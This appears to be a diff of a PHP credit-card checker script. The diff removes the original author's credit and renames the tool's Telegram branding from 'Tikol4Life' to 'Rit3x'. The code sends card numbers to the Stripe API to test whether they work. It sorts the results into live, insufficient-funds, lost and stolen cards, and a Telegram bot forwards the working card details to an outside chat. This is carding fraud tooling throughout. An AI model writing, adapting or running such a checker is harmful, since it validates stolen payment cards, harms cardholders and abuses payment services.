@@ -1,5 +1,4 @@
 <?php
-//Script Author: ᴛɪᴋᴏʟ4ʟɪғᴇ https://t.me/Tikol4Life
 
 /*===[PHP Setup]==============================================*/
 error_reporting(0);
@@ -32,7 +31,7 @@ if (isset($pm)) {
     curl_setopt($ch2, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
     curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch2, CURLOPT_POST, 1);
-    curl_setopt($ch2, CURLOPT_POSTFIELDS, 'name='.$name_full.'&email='.$email.'&description=Tikol4Life&address[line1]='.$location_street.'&address[city]='.$location_city.'&address[state]='.$location_state.'&address[postal_code]='.$location_postcode.'&address[country]=US');
+    curl_setopt($ch2, CURLOPT_POSTFIELDS, 'name='.$name_full.'&email='.$email.'&description=Rit3x&address[line1]='.$location_street.'&address[city]='.$location_city.'&address[state]='.$location_state.'&address[postal_code]='.$location_postcode.'&address[country]=US');
     curl_setopt($ch2, CURLOPT_USERPWD, $sk . ':' . '');
     $headers = array();
     $headers[] = 'Content-Type: application/x-www-form-urlencoded';
@@ -83,7 +82,7 @@ if (isset($res1['error'])) {
         //CCN LIVE
         if(isset($telebot) && $telebot != ""){
             if($tele_msg == "2"|| $tele_msg == "3") {
-                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
+                BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
             }
         }
         EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
@@ -91,7 +90,7 @@ if (isset($res1['error'])) {
         //CVV LIVE: Insufficient Funds
         if(isset($telebot) && $telebot != ""){
             if($tele_msg == "1"|| $tele_msg == "3") {
-                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
+                BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
             }
         }
         EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
@@ -99,7 +98,7 @@ if (isset($res1['error'])) {
         //CCN LIVE: Lost Card
         if(isset($telebot) && $telebot != ""){
             if($tele_msg == "2"|| $tele_msg == "3") {
-                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
+                BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
             }
         }
         EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
@@ -107,7 +106,7 @@ if (isset($res1['error'])) {
         //CCN LIVE: Stolen Card
         if(isset($telebot) && $telebot != ""){
             if($tele_msg == "2"|| $tele_msg == "3") {
-                BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
+                BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
             }
         }
         EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
@@ -141,7 +140,7 @@ if (isset($res1['error'])) {
             //CCN LIVE
             if(isset($telebot) && $telebot != ""){
                 if($tele_msg == "2"|| $tele_msg == "3") {
-                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
+                    BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
                 }
             }
             EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
@@ -149,7 +148,7 @@ if (isset($res1['error'])) {
             //CVV LIVE: Insufficient Funds
             if(isset($telebot) && $telebot != ""){
                 if($tele_msg == "1"|| $tele_msg == "3") {
-                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
+                    BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
                 }
             }
             EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
@@ -157,7 +156,7 @@ if (isset($res1['error'])) {
             //CCN LIVE: Stolen Card
             if(isset($telebot) && $telebot != ""){
                 if($tele_msg == "2"|| $tele_msg == "3") {
-                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
+                    BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
                 }
             }
             EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
@@ -165,7 +164,7 @@ if (isset($res1['error'])) {
             //CCN LIVE: Lost Card
             if(isset($telebot) && $telebot != ""){
                 if($tele_msg == "2"|| $tele_msg == "3") {
-                    BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
+                    BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
                 }
             }
             EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
@@ -190,7 +189,7 @@ if (isset($res1['error'])) {
                 //CCN LIVE
                 if(isset($telebot) && $telebot != ""){
                     if($tele_msg == "2"|| $tele_msg == "3") {
-                        BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
+                        BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
                     }
                 }
                 EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
@@ -198,7 +197,7 @@ if (isset($res1['error'])) {
                 //CVV LIVE: Insufficient Funds
                 if(isset($telebot) && $telebot != ""){
                     if($tele_msg == "1"|| $tele_msg == "3") {
-                        BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
+                        BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CVV Match [Insuf. Balance]%0A",$telebot);
                     }
                 }
                 EchoMessage('CVV LIVE',$cc_info.' >> '.$err);
@@ -206,7 +205,7 @@ if (isset($res1['error'])) {
                 //CCN LIVE: Stolen
                 if(isset($telebot) && $telebot != ""){
                     if($tele_msg == "2"|| $tele_msg == "3") {
-                        BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
+                        BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Stolen Card]%0A",$telebot);
                     }
                 }
                 EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
@@ -214,7 +213,7 @@ if (isset($res1['error'])) {
                 //CCN LIVE: Lost Card
                 if(isset($telebot) && $telebot != ""){
                     if($tele_msg == "2"|| $tele_msg == "3") {
-                        BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
+                        BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Lost Card]%0A",$telebot);
                     }
                 }
                 EchoMessage('CCN LIVE',$cc_info.' >> '.$err);
@@ -228,7 +227,7 @@ if (isset($res1['error'])) {
                 //CVV MATCH CONGRATS
                 if(isset($telebot) && $telebot != ""){
                     if($tele_msg == "1"|| $tele_msg == "3") {
-                        BotForwarder("<b>Tikol4Life Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
+                        BotForwarder("<b>Rit3x Telegram Forwarder</b>%0A%0A<b>CC_Info</b>: $cc_info%0A<b>CC_Status</b>: CCN Match [Incorrect CVV]%0A",$telebot);
                     }
                 }
                 EchoMessage('CVV LIVE',$cc_info.' >> cvc_check : '.$cvc_res3);
